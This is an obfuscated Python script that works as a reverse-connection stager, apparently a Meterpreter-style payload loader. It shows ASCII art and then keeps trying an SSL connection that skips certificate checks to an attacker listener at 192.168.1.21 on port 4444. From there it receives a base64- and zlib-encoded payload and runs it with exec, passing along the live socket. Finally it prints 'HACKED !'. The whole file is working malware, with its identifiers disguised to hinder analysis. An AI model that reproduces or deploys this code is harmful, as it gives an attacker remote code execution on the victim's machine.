lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll = exec, bool, str, len, print

from fade import fire as llIIIlllIIlIlI
from ssl import _create_unverified_context as IIllIllllllllI
from socket import socket as IIlIIIlIIlIIll, AF_INET as lllllIIIIlIllI, SOCK_STREAM as lIIIlIIIIIIlll
from struct import unpack as lIIllIIllIllII
from zlib import decompress as IllIIlIlllIlll
from base64 import b64decode as IIIIIllIlIIlIl
from time import sleep as IllIIllllllIll
from colorama import Fore as IlllIIIIlIlIII, init as IIIllIIlIIllIl
IllIlIIllIlllIllll = "\n\n                              ...\n           s,                .                    .s\n            ss,              . ..               .ss\n            'SsSs,           ..  .           .sSsS'\n             sSs'sSs,        .   .        .sSs'sSs\n              sSs  'sSs,      ...      .sSs'  sSs\n               sS,    'sSs,         .sSs'    .Ss\n               'Ss       'sSs,   .sSs'       sS'\n      ...       sSs         ' .sSs'         sSs       ...\n     .           sSs       .sSs' ..,       sSs       .\n     . ..         sS,   .sSs'  .  'sSs,   .Ss        . ..\n     ..  .        'Ss .Ss'     .     'sSs. ''        ..  .\n     .   .         sSs '       .        'sSs,        .   .\n      ...      .sS.'sSs        .        .. 'sSs,      ...\n            .sSs'    sS,     .....     .Ss    'sSs,\n         .sSs'       'Ss       .       sS'       'sSs,\n      .sSs'           sSs      .      sSs           'sSs,\n   .sSs'____________________________ sSs ______________'sSs,\n.sSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS'.Ss SSSSSSSSSSSSSSSSSSSSSs,\n                        ...         sS'\n                         sSs       sSs\n                          sSs     sSs\n                           sS,   .Ss\n                           'Ss   sS'\n                            sSs sSs\n                             sSsSs\n                              sSs\n                               s\n"
IlIlIlIIIIlIlllIlI = llIIIlllIIlIlI(IllIlIIllIlllIllll)
llllllllllllIll(IlIlIlIIIIlIlllIlI)
IIIllIIlIIllIl()
lllIIIIllIlIllIlII = IlllIIIIlIlIII.RED + '[+] ' + IlllIIIIlIlIII.WHITE
IllIlllIlIIIlIlIll = '192.168.1.21'
llllllllllllIll(lllIIIIllIlIllIlII + 'IP SUCCESSFULY SET UP')
lIIlllIlllIIIlIlII = 4444
llllllllllllIll(lllIIIIllIlIllIlII + 'PORT : ' + lllllllllllllIl(lIIlllIlllIIIlIlII))
IlllIIIIIlllIIIllI = IIllIllllllllI()
llllllllllllIll(lllIIIIllIlIllIlII + 'SSL CONTEXT OK')
llllllllllllIll(lllIIIIllIlIllIlII + 'WAITING FOR HANDLER')
while llllllllllllllI(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1):
    try:
        with IIlIIIlIIlIIll(lllllIIIIlIllI, lIIIlIIIIIIlll, 0) as lIIlIlIlIIIlllllII:
            with IlllIIIIIlllIIIllI.wrap_socket(lIIlIlIlIIIlllllII, server_hostname=IllIlllIlIIIlIlIll) as lIIIllIllIIIlIIIlI:
                lIIIllIllIIIlIIIlI.connect((IllIlllIlIIIlIlIll, lIIlllIlllIIIlIlII))
                lIlIIIIIIIIlllIIlI = lIIllIIllIllII('>I', lIIIllIllIIIlIIIlI.recv(12000))[0]
                llIIIIlIllIlIlIIII = lIIIllIllIIIlIIIlI.recv(lIlIIIIIIIIlllIIlI)
                while lllllllllllllII(llIIIIlIllIlIlIIII) < lIlIIIIIIIIlllIIlI:
                    llIIIIlIllIlIlIIII += lIIIllIllIIIlIIIlI.recv(lIlIIIIIIIIlllIIlI - lllllllllllllII(llIIIIlIllIlIlIIII))
                lllllllllllllll(IllIIlIlllIlll(IIIIIllIlIIlIl(llIIIIlIllIlIlIIII)), {'s': lIIIllIllIIIlIIIlI})
                llllllllllllIll(lllIIIIllIlIllIlII + 'HACKED !')
                break
    except:
        IllIIllllllIll(1)